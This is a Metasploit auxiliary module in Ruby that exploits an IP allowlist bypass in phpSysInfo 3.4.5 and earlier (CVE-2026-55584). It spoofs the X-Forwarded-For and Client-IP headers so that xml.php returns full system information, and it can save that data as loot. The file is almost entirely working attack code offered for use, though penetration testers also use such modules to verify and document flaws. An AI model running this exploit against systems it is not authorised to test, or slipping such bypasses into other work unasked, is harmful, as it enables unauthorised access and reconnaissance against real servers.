##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck
  CheckCode = Exploit::CheckCode

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'phpSysInfo PSI_ALLOWED IP Allowlist Bypass',
        'Description' => %q{
          This module exploits an IP allowlist bypass in phpSysInfo <= 3.4.5
          (CVE-2026-55584 / GHSA-786w-p5pm-cvgh). The PSI_ALLOWED allowlist that
          guards xml.php resolves the client's IP from the attacker-controlled
          X-Forwarded-For header, then Client-IP, before falling back to the
          trustworthy REMOTE_ADDR. There is no trusted-proxy concept, so an
          attacker who knows (or guesses) an address present in PSI_ALLOWED can
          spoof that header and read the full system information xml.php
          exposes, bypassing the allowlist entirely. Fixed upstream in 3.4.6.
        },
        'Author' => [
          'Muhammed Mirac Kayikci', # vulnerability discovery
          'xof34' # Metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2026-55584'],
          ['GHSA', '786w-p5pm-cvgh', 'phpsysinfo/phpsysinfo'],
          ['URL', 'https://exploit-db.com/exploits/52648']
        ],
        'DisclosureDate' => '2026-07-11',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'Base path to the phpSysInfo installation', '/']),
        OptString.new('SPOOFED_IP', [
          true,
          'An IP address believed to be present in the target\'s PSI_ALLOWED allowlist',
          '127.0.0.1'
        ]),
        OptBool.new('STORE_LOOT', [true, 'Store the retrieved system XML as loot', false])
      ]
    )
  end

  def xml_uri
    normalize_uri(target_uri.path, 'xml.php')
  end

  def looks_like_system_xml?(res)
    res && res.code == 200 && res.body =~ /<(Root|Vitals|Hardware)\b/i
  end

  def fetch(header_name)
    headers = header_name ? { header_name => datastore['SPOOFED_IP'] } : {}
    send_request_cgi(
      'method' => 'GET',
      'uri' => xml_uri,
      'headers' => headers
    )
  end

  def check
    baseline = fetch(nil)
    return CheckCode::Unknown('No response from target') unless baseline

    if looks_like_system_xml?(baseline)
      return CheckCode::Safe('xml.php is already reachable without spoofing a header; allowlist may be disabled or not in use.')
    end

    %w[X-Forwarded-For Client-IP].each do |header|
      res = fetch(header)
      return CheckCode::Appears("Allowlist bypassed via #{header} with SPOOFED_IP=#{datastore['SPOOFED_IP']}.") if looks_like_system_xml?(res)
    end

    CheckCode::Safe('Could not bypass the allowlist with the current SPOOFED_IP value; target may not be vulnerable or SPOOFED_IP is wrong.')
  end

  def run
    %w[X-Forwarded-For Client-IP].each do |header|
      res = fetch(header)
      fail_with(Failure::Unreachable, 'Request timed out.') unless res
      next unless looks_like_system_xml?(res)

      print_good("Allowlist bypassed using #{header}: #{datastore['SPOOFED_IP']}")

      if datastore['STORE_LOOT']
        path = store_loot('phpsysinfo.xml', 'application/xml', rhost, res.body, 'xml.php', 'phpSysInfo system XML (allowlist bypass)')
        print_good("Saved system XML to: #{path}")
      else
        print_good("Response:\n#{res.body}")
      end
      return
    end

    fail_with(
      Failure::NoAccess,
      "Could not bypass the allowlist with SPOOFED_IP=#{datastore['SPOOFED_IP']}. " \
      'Try a different candidate IP (e.g. an address the admin would plausibly trust).'
    )
  end
end
